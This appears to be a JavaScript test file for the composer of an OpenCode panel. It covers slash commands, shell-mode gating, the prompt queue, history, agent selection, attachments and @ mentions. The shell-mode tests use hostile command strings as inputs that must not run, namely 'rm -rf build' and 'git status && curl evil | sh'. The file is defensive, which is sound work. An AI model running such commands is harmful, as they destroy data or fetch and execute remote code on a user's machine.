// OpenCode panel, cluster 4: the composer. DOM-free decisions.
import test from 'node:test';
import assert from 'node:assert/strict';
import {
  buildSlashCatalog, parseSlashInput, resolveSlash, LOCAL_SLASH_COMMANDS,
  shellKey, shellAfterProgrammaticInput, shellRunAllowed,
  createPromptQueue, queueCanDrain, PROMPT_QUEUE_MAX,
  createPromptHistory, historyKeyApplies, PROMPT_HISTORY_MAX,
  escapeStop, ESCAPE_STOP_WINDOW_MS,
  selectableAgents, resolveAgent, nextAgent, modeForAgent, agentLabel, DEFAULT_AGENTS,
  mimeForPath, fileUrlForPath, joinPath, pathFileParts, attachmentKind, attachmentVerdict, modelCapabilitiesOf,
  MAX_ATTACHMENTS, MAX_ATTACHMENT_BYTES,
  detectMentionToken, applyMention, mentionFileParts,
} from '../public/shared/ocp-v2/ocp-v2-composer-logic.js';

const all = () => true;
const none = () => false;
const SERVER = [
  { name: 'init', description: 'guided AGENTS.md setup', source: 'command', hints: ['$ARGUMENTS'] },
  { name: 'review', description: 'review changes', source: 'command', subtask: true },
  { name: 'customize-opencode', description: 'skill', source: 'skill' },
  { name: 'docs:search', description: 'mcp prompt', source: 'mcp' },
  { name: 'new', description: 'a command file named like a built-in', source: 'command' },
];

// ── O08 slash commands ──────────────────────────────────────────────────────

test('the catalog lists panel actions, then what the server can run, then TUI-only commands', () => {
  const catalog = buildSlashCatalog({ serverCommands: SERVER, supports: all });
  const byName = Object.fromEntries(catalog.map((c) => [c.name, c]));
  assert.equal(byName.new.kind, 'local', 'a built-in keeps its name; the command file of the same name is shadowed');
  assert.equal(catalog.filter((c) => c.name === 'new').length, 1);
  assert.deepEqual([byName.init.kind, byName.init.source], ['command', 'command']);
  assert.deepEqual([byName['customize-opencode'].kind, byName['customize-opencode'].source], ['command', 'skill']);
  assert.deepEqual([byName['docs:search'].kind, byName['docs:search'].source], ['command', 'mcp']);
  assert.equal(byName.themes.kind, 'tui');
  assert.equal(byName.import, undefined, '/import has no endpoint and is gone');
  for (const cmd of LOCAL_SLASH_COMMANDS) assert.equal(byName[cmd.name].kind, 'local', cmd.name);

  // With sharing disabled in the OpenCode config, /share and /unshare are not listed.
  const noShare = buildSlashCatalog({ serverCommands: SERVER, supports: all, sharePolicy: 'disabled' });
  assert.equal(noShare.find((c) => c.name === 'share'), undefined);
  assert.equal(noShare.find((c) => c.name === 'unshare'), undefined);
  assert.equal(resolveSlash('/share', noShare), null);
  assert.ok(buildSlashCatalog({ serverCommands: SERVER, supports: all, sharePolicy: 'manual' }).find((c) => c.name === 'share'));
});

test('against a server that predates the request types, nothing unrunnable is offered', () => {
  const legacy = { skills: [{ name: 'synabun', description: 'memory hub' }], userCommands: [{ name: 'deploy', description: 'ship it' }] };
  const catalog = buildSlashCatalog({ serverCommands: null, legacy, supports: none });
  const byName = Object.fromEntries(catalog.map((c) => [c.name, c]));
  for (const gone of ['undo', 'redo', 'share', 'unshare', 'fork']) assert.equal(byName[gone], undefined, gone);
  for (const kept of ['new', 'sessions', 'compact', 'export', 'models', 'agents', 'help']) assert.equal(byName[kept].kind, 'local', kept);
  // Skills and command files are listed but sent as typed, exactly as before.
  assert.equal(byName.synabun.kind, 'text');
  assert.equal(byName.deploy.kind, 'text');
  assert.equal(byName.init.kind, 'tui');
  // A server list without command:run is not runnable either.
  const noRun = buildSlashCatalog({ serverCommands: SERVER, legacy, supports: (t) => t !== 'command:run' });
  assert.equal(noRun.find((c) => c.name === 'review'), undefined);
  assert.equal(noRun.find((c) => c.name === 'deploy').kind, 'text');
});

test('parseSlashInput takes a command only at the very start of the text', () => {
  assert.deepEqual(parseSlashInput('/review main'), { name: 'review', args: 'main' });
  assert.deepEqual(parseSlashInput('  /undo  '), { name: 'undo', args: '' });
  assert.deepEqual(parseSlashInput('/docs:search how do\nI do this'), { name: 'docs:search', args: 'how do\nI do this' });
  assert.equal(parseSlashInput('/Users/me/project/file.js is broken'), null, 'an absolute path is not a command');
  assert.equal(parseSlashInput('//comment'), null);
  assert.equal(parseSlashInput('please /undo that'), null);
  assert.equal(parseSlashInput('/'), null);
  assert.equal(parseSlashInput(''), null);
  assert.equal(parseSlashInput('/-x'), null);
});

test('resolveSlash routes a typed line: local action, OpenCode command, TUI, or plain prompt', () => {
  const catalog = buildSlashCatalog({ serverCommands: SERVER, supports: all });
  assert.deepEqual(resolveSlash('/undo', catalog), { kind: 'local', action: 'undo', name: 'undo', args: '' });
  assert.deepEqual(resolveSlash('/clear', catalog), { kind: 'local', action: 'new', name: 'new', args: '' });
  assert.deepEqual(resolveSlash('/summarize', catalog), { kind: 'local', action: 'compact', name: 'compact', args: '' });
  assert.deepEqual(resolveSlash('/resume', catalog), { kind: 'local', action: 'sessions', name: 'sessions', args: '' });
  assert.deepEqual(resolveSlash('/review main --staged', catalog), { kind: 'command', command: 'review', args: 'main --staged' });
  assert.deepEqual(resolveSlash('/init', catalog), { kind: 'command', command: 'init', args: '' });
  assert.deepEqual(resolveSlash('/themes', catalog), { kind: 'tui', command: 'themes', args: '' });
  // Unknown names and paths are prompts.
  assert.equal(resolveSlash('/nonsense do it', catalog), null);
  assert.equal(resolveSlash('/etc/hosts has a bad entry', catalog), null);
  assert.equal(resolveSlash('hello', catalog), null);
  // A `text` entry (legacy list on an old server) goes out as typed.
  const old = buildSlashCatalog({ legacy: { skills: [{ name: 'synabun' }], userCommands: [] }, supports: none });
  assert.equal(resolveSlash('/synabun audit', old), null);
  assert.equal(resolveSlash('/undo', old), null, 'a command the server cannot do is not intercepted');
});

// ── O20 shell mode (D4) ─────────────────────────────────────────────────────

test('shell mode is entered only by a real "!" key press on an empty composer', () => {
  const press = (extra) => shellKey({ shell: false, value: '', key: '!', trusted: true, composing: false, supported: true, ...extra });
  assert.deepEqual(press(), { shell: true, preventDefault: true });
  assert.deepEqual(press({ value: 'x' }), { shell: false, preventDefault: false }, 'not on a composer that has text');
  assert.deepEqual(press({ value: ' ' }), { shell: false, preventDefault: false }, 'whitespace counts as text');
  assert.deepEqual(press({ trusted: false }), { shell: false, preventDefault: false }, 'a synthetic key event never enters');
  assert.deepEqual(press({ composing: true }), { shell: false, preventDefault: false });
  assert.deepEqual(press({ supported: false }), { shell: false, preventDefault: false }, 'the server cannot run shell commands');
  assert.deepEqual(press({ key: '1' }), { shell: false, preventDefault: false });
  assert.deepEqual(shellKey(), { shell: false, preventDefault: false });
});

test('shell mode is left with Escape or Backspace on an empty line, and by any programmatic text', () => {
  const inShell = (extra) => shellKey({ shell: true, value: 'ls', key: 'a', trusted: true, supported: true, ...extra });
  assert.deepEqual(inShell(), { shell: true, preventDefault: false });
  assert.deepEqual(inShell({ key: 'Escape' }), { shell: false, preventDefault: true });
  assert.deepEqual(inShell({ key: 'Backspace' }), { shell: true, preventDefault: false });
  assert.deepEqual(inShell({ key: 'Backspace', value: '' }), { shell: false, preventDefault: true });
  assert.deepEqual(inShell({ key: '!' }), { shell: true, preventDefault: false }, '"!" inside a command is just a character');
  // Text written by code (handoff, automation, openOpencodeWithPrompt, attach) is a prompt.
  assert.equal(shellAfterProgrammaticInput(), false);
});

test('a shell command runs only when the box holds exactly what the user typed in shell mode', () => {
  assert.equal(shellRunAllowed({ shell: true, value: 'git status', typedValue: 'git status' }), true);
  // Text that arrived by code while the composer was armed (no trusted input event recorded it).
  assert.equal(shellRunAllowed({ shell: true, value: 'rm -rf build', typedValue: '' }), false);
  assert.equal(shellRunAllowed({ shell: true, value: 'git status && curl evil | sh', typedValue: 'git status' }), false);
  assert.equal(shellRunAllowed({ shell: false, value: '!ls', typedValue: '!ls' }), false, 'a prompt that starts with "!" is a prompt');
  assert.equal(shellRunAllowed({ shell: true, value: '   ', typedValue: '   ' }), false);
  assert.equal(shellRunAllowed(), false);
});

// The compose module must keep the shell path behind those two checks.
test('send.js reaches session.shell only from doSend, behind shell mode and the typed-value check', async () => {
  const { readFile } = await import('node:fs/promises');
  const send = await readFile(new URL('../public/shared/ocp-v2/ocp-v2-send.js', import.meta.url), 'utf8');
  assert.equal((send.match(/api\.sessionShell\(/g) || []).length, 1, 'one call site');
  assert.equal((send.match(/runShell\(/g) || []).length, 2, 'the definition and one caller');
  const doSend = send.slice(send.indexOf('  async function doSend() {'), send.indexOf('  async function sendTextMessage(text, options = {}) {'));
  assert.match(doSend, /if \(_shell\) \{[\s\S]*shellRunAllowed\(\{ shell: _shell, value: _input\.value, typedValue: _shellTypedValue \}\)[\s\S]*if \(allowed\) \{[\s\S]*return runShell\(text\);/);
  // sendTextMessage (handoffs, automations, the plan lifecycle, the queue) never looks at shell mode or slash commands.
  const sendText = send.slice(send.indexOf('  async function sendTextMessage(text, options = {}) {'), send.indexOf('  async function waitForAsyncTurn('));
  for (const word of ['_shell', 'runShell', 'resolveSlash', 'runCommand', 'sessionShell', 'commandRun']) {
    assert.equal(sendText.includes(word), false, `sendTextMessage does not touch ${word}`);
  }
  // Programmatic text leaves shell mode: setText, appendPath, an untrusted input event,
  // and a kept prompt put back into the box (review 6, N02).
  assert.equal((send.match(/setShellMode\(shellAfterProgrammaticInput\(\)\)/g) || []).length, 4);
  assert.match(send, /trusted: e\.isTrusted/);
  // The typed value is recorded by trusted input events only, and reset whenever the mode flips.
  assert.match(send, /else \{\s+_history\.reset\(\);\s+if \(_shell\) _shellTypedValue = _input\.value;\s+\}/);
});

// ── O19 queue (D6) ──────────────────────────────────────────────────────────

test('the queue holds prompts in order, bounded, and reports changes', () => {
  const queue = createPromptQueue();
  let changes = 0;
  queue.subscribe(() => { changes += 1; });
  const a = queue.add({ text: ' first ' });
  const b = queue.add({ text: '', images: [{ name: 'i.png' }] });
  assert.equal(queue.add({ text: '   ' }), null, 'nothing to send is not queued');
  assert.deepEqual(queue.list().map((i) => [i.id, i.text, i.images.length]), [[a.id, 'first', 0], [b.id, '', 1]]);
  assert.deepEqual(a.mentions, []);
  // A queued prompt keeps the file parts of the @ mentions it was typed with.
  const withMention = createPromptQueue().add({ text: 'see @a.js', mentions: [{ type: 'file', url: 'file:///p/a.js' }] });
  assert.deepEqual(withMention.mentions, [{ type: 'file', url: 'file:///p/a.js' }]);
  queue.remove(a.id);
  queue.remove('nope');
  assert.deepEqual(queue.list().map((i) => i.id), [b.id]);
  assert.equal(queue.shift().id, b.id);
  assert.equal(queue.shift(), null);
  queue.unshift(b);
  assert.equal(queue.size(), 1);
  assert.equal(changes, 5);
  for (let i = 0; i < PROMPT_QUEUE_MAX + 5; i++) queue.add({ text: `p${i}` });
  assert.equal(queue.size(), PROMPT_QUEUE_MAX);
  queue.clear();
  assert.equal(queue.size(), 0);
});

test('the queue drains only after a clean finish; a stop or an error pauses it', () => {
  const queue = createPromptQueue();
  const idle = { sessionId: 's', running: false, pendingPermissions: [], pendingQuestions: [], sessionStatus: { type: 'idle' } };
  assert.equal(queueCanDrain(queue, idle), false, 'empty');
  queue.add({ text: 'next' });
  assert.equal(queueCanDrain(queue, idle), true);
  assert.equal(queueCanDrain(queue, { ...idle, running: true }), false);
  assert.equal(queueCanDrain(queue, { ...idle, sessionStatus: { type: 'retry' } }), false);
  assert.equal(queueCanDrain(queue, { ...idle, pendingPermissions: [{}] }), false);
  assert.equal(queueCanDrain(queue, { ...idle, pendingQuestions: [{}] }), false);
  assert.equal(queueCanDrain(queue, { ...idle, showPostPlanActions: true }), false);
  assert.equal(queueCanDrain(queue, { ...idle, planTurnActive: true }), false);
  assert.equal(queueCanDrain(queue, { ...idle, sessionId: null }), false);
  queue.pause();
  assert.equal(queue.isPaused(), true);
  assert.equal(queueCanDrain(queue, idle), false);
  queue.resume();
  assert.equal(queueCanDrain(queue, idle), true);
  // Pausing an empty queue is a no-op: nothing is waiting to be held back.
  queue.clear();
  queue.pause();
  assert.equal(queue.isPaused(), false);
});

// ── P27 prompt history ──────────────────────────────────────────────────────

test('history walks back and forward and gives the draft back', () => {
  const history = createPromptHistory(['one', 'two']);
  history.push('three');
  history.push('three');
  history.push('   ');
  assert.deepEqual(history.entries(), ['one', 'two', 'three']);
  assert.equal(history.next(), null, 'already at the draft');
  assert.equal(history.prev('half typed'), 'three');
  assert.equal(history.prev('three'), 'two');
  assert.equal(history.prev('two'), 'one');
  assert.equal(history.prev('one'), null);
  assert.equal(history.browsing(), true);
  assert.equal(history.next(), 'two');
  assert.equal(history.next(), 'three');
  assert.equal(history.next(), 'half typed');
  assert.equal(history.browsing(), false);
  const many = createPromptHistory();
  for (let i = 0; i < PROMPT_HISTORY_MAX + 10; i++) many.push(`p${i}`);
  assert.equal(many.entries().length, PROMPT_HISTORY_MAX);
  assert.equal(many.entries()[0], 'p10');
  assert.deepEqual(createPromptHistory(['a', 5, '', null]).entries(), ['a']);
});

test('arrow keys recall history only where they would not move the caret in the text', () => {
  const key = (extra) => historyKeyApplies({ key: 'ArrowUp', value: '', selectionStart: 0, selectionEnd: 0, browsing: false, ...extra });
  assert.equal(key(), true);
  assert.equal(key({ value: 'draft', selectionStart: 0, selectionEnd: 0 }), true, 'caret at the very start');
  assert.equal(key({ value: 'draft', selectionStart: 3, selectionEnd: 3 }), false);
  assert.equal(key({ value: 'a\nb', selectionStart: 3, selectionEnd: 3 }), false);
  assert.equal(key({ value: 'recalled', selectionStart: 8, selectionEnd: 8, browsing: true }), true);
  assert.equal(key({ value: 'x', selectionStart: 0, selectionEnd: 1 }), false, 'a selection is being edited');
  assert.equal(key({ key: 'ArrowDown' }), false);
  assert.equal(key({ key: 'ArrowDown', browsing: true, value: 'recalled', selectionStart: 8, selectionEnd: 8 }), true);
  assert.equal(key({ key: 'ArrowDown', browsing: true, value: 'a\nb', selectionStart: 1, selectionEnd: 1 }), false);
  assert.equal(key({ key: 'Enter' }), false);
});

// ── P28 Escape to stop ──────────────────────────────────────────────────────

test('Escape stops a running turn on the second press within the window', () => {
  assert.deepEqual(escapeStop(0, 1000, false), { stop: false, armedAt: 0 });
  const first = escapeStop(0, 1000, true);
  assert.deepEqual(first, { stop: false, armedAt: 1000 });
  assert.deepEqual(escapeStop(first.armedAt, 1000 + ESCAPE_STOP_WINDOW_MS, true), { stop: true, armedAt: 0 });
  assert.deepEqual(escapeStop(first.armedAt, 1001 + ESCAPE_STOP_WINDOW_MS, true), { stop: false, armedAt: 1001 + ESCAPE_STOP_WINDOW_MS });
});

// ── O09 agents ──────────────────────────────────────────────────────────────

test('the agent picker lists primary and all-mode agents that are not hidden, build and plan first', () => {
  const agents = selectableAgents([
    { name: 'summary', mode: 'primary', hidden: true },
    { name: 'explore', mode: 'subagent', description: 'sub' },
    { name: 'reviewer', mode: 'all', description: 'Reviews code', color: '#abc' },
    { name: 'plan', mode: 'primary', description: 'Plan mode' },
    { name: 'build', mode: 'primary', description: 'Default' },
    { name: 'architect', mode: 'primary' },
    { name: 'build', mode: 'primary' },
    null,
  ]);
  assert.deepEqual(agents.map((a) => a.name), ['build', 'plan', 'architect', 'reviewer']);
  assert.deepEqual(agents[3], { name: 'reviewer', description: 'Reviews code', color: '#abc' });
  assert.deepEqual(selectableAgents(null), []);
  assert.deepEqual(DEFAULT_AGENTS.map((a) => a.name), ['build', 'plan']);
});

test('agent helpers: fallback, cycling, plan lifecycle, labels', () => {
  const agents = [{ name: 'build' }, { name: 'plan' }, { name: 'docs-writer' }];
  assert.equal(resolveAgent('plan', agents), 'plan');
  assert.equal(resolveAgent('deleted-agent', agents), 'build');
  assert.equal(resolveAgent('', [{ name: 'only' }]), 'only');
  assert.equal(resolveAgent('x', []), 'build');
  assert.equal(nextAgent('build', agents), 'plan');
  assert.equal(nextAgent('docs-writer', agents), 'build');
  assert.equal(nextAgent('gone', agents), 'build');
  assert.equal(nextAgent('build', []), 'build');
  assert.equal(modeForAgent('plan'), 'plan');
  assert.equal(modeForAgent('docs-writer'), 'build');
  assert.equal(agentLabel('docs-writer'), 'Docs writer');
  assert.equal(agentLabel('build'), 'Build');
});

// ── O10 attachments (P18) ───────────────────────────────────────────────────

test('paths go out as file parts with a mime OpenCode can act on', () => {
  assert.equal(mimeForPath('/a/b/shot.PNG'), 'image/png');
  assert.equal(mimeForPath('/a/b/doc.pdf'), 'application/pdf');
  assert.equal(mimeForPath('/a/b/src/'), 'application/x-directory');
  assert.equal(mimeForPath('/a/b/src'), 'text/plain');
  assert.equal(mimeForPath('/a/b/mod.ts'), 'text/plain');
  assert.equal(fileUrlForPath('/work/my app/a#b.js'), 'file:///work/my%20app/a%23b.js');
  assert.equal(fileUrlForPath('C:\\work\\a.js'), 'file:///C%3A/work/a.js');
  assert.equal(joinPath('/work/app/', 'src/a.js'), '/work/app/src/a.js');
  assert.equal(joinPath('/work/app', '/abs/a.js'), '/abs/a.js');
  assert.equal(joinPath('', 'src/a.js'), 'src/a.js');
  assert.deepEqual(pathFileParts(['/work/app/src/a.js', '', '/work/app/shot.jpg']), [
    { type: 'file', mime: 'text/plain', filename: 'a.js', url: 'file:///work/app/src/a.js' },
    { type: 'file', mime: 'image/jpeg', filename: 'shot.jpg', url: 'file:///work/app/shot.jpg' },
  ]);
  assert.deepEqual(pathFileParts(null), []);
});

test('an attachment is checked against the selected model before it is added', () => {
  const vision = { input: { text: true, image: true, pdf: true } };
  const textOnly = { input: { text: true, image: false, pdf: false } };
  const png = { name: 'shot.png', type: 'image/png', size: 1000 };
  const pdf = { name: 'spec.pdf', type: 'application/pdf', size: 1000 };
  const code = { name: 'mod.ts', type: '', size: 1000 };
  const zip = { name: 'bundle.zip', type: 'application/zip', size: 1000 };
  assert.deepEqual(attachmentVerdict(png, vision), { ok: true, kind: 'image' });
  assert.deepEqual(attachmentVerdict(png, null), { ok: true, kind: 'image' }, 'unknown model: let the provider answer');
  assert.deepEqual(attachmentVerdict(png, textOnly), { ok: false, reason: 'The selected model does not take images.' });
  assert.deepEqual(attachmentVerdict(pdf, textOnly), { ok: false, reason: 'The selected model does not take PDFs.' });
  assert.deepEqual(attachmentVerdict(pdf, vision), { ok: true, kind: 'pdf' });
  assert.deepEqual(attachmentVerdict(code, textOnly), { ok: true, kind: 'text' });
  assert.equal(attachmentVerdict(zip, vision).ok, false);
  assert.match(attachmentVerdict({ ...png, size: MAX_ATTACHMENT_BYTES + 1 }, vision).reason, /larger than 10 MB/);
  assert.match(attachmentVerdict(png, vision, { count: MAX_ATTACHMENTS }).reason, /At most 10 attachments/);
  assert.equal(attachmentKind({ name: 'data.json', type: 'application/json' }), 'text');
  assert.equal(attachmentKind({ name: 'README', type: 'text/markdown' }), 'text');
  assert.equal(attachmentKind({ name: 'x.bin', type: '' }), 'other');
});

test('model capabilities come from the provider list', () => {
  const providers = [{ id: 'opencode', models: { 'big-pickle': { capabilities: { input: { image: false } } } } }, { id: 'broken' }];
  assert.deepEqual(modelCapabilitiesOf(providers, { providerID: 'opencode', modelID: 'big-pickle' }), { input: { image: false } });
  assert.equal(modelCapabilitiesOf(providers, { providerID: 'opencode', modelID: 'other' }), null);
  assert.equal(modelCapabilitiesOf(providers, { providerID: 'broken', modelID: 'm' }), null);
  assert.equal(modelCapabilitiesOf(providers, null), null);
  assert.equal(modelCapabilitiesOf(null, { providerID: 'a', modelID: 'b' }), null);
});

// ── O11 @ mentions ──────────────────────────────────────────────────────────

test('the mention token is the @word under the caret', () => {
  assert.deepEqual(detectMentionToken('look at @src/ap', 15), { start: 8, end: 15, query: 'src/ap' });
  assert.deepEqual(detectMentionToken('@', 1), { start: 0, end: 1, query: '' });
  assert.deepEqual(detectMentionToken('a @b c', 4), { start: 2, end: 4, query: 'b' });
  assert.equal(detectMentionToken('mail me@example.com', 19), null);
  assert.equal(detectMentionToken('look at src', 11), null);
  assert.equal(detectMentionToken('@a@b', 4), null);
  assert.equal(detectMentionToken('@src done', 9), null, 'the caret has moved past the token');
  assert.deepEqual(applyMention('look at @src/ap now', { start: 8, end: 15 }, 'src/app.js'), { value: 'look at @src/app.js  now', caret: 20 });
});

test('picked mentions become file parts that point back at their text; typed @words do not', () => {
  const text = 'compare @src/a.js with @docs/ and @someone';
  const parts = mentionFileParts(text, new Set(['src/a.js', 'docs/', 'removed/later.js']), '/work/app');
  assert.deepEqual(parts, [
    {
      type: 'file', mime: 'text/plain', filename: 'a.js', url: 'file:///work/app/src/a.js',
      source: { type: 'file', path: '/work/app/src/a.js', text: { value: '@src/a.js', start: 8, end: 17 } },
    },
    {
      type: 'file', mime: 'application/x-directory', filename: 'docs', url: 'file:///work/app/docs/',
      source: { type: 'file', path: '/work/app/docs/', text: { value: '@docs/', start: 23, end: 29 } },
    },
  ]);
  assert.equal(text.slice(8, 17), '@src/a.js');
  // A longer path that merely starts with a picked one is not that mention.
  assert.deepEqual(mentionFileParts('see @src/a.json', new Set(['src/a.js']), '/work/app'), []);
  assert.equal(mentionFileParts('see @src/a.json and @src/a.js', new Set(['src/a.js']), '/work/app')[0].source.text.start, 20);
  assert.deepEqual(mentionFileParts('nothing here', new Set(['src/a.js']), '/work/app'), []);
  assert.deepEqual(mentionFileParts('@src/a.js', null, '/work/app'), []);
});
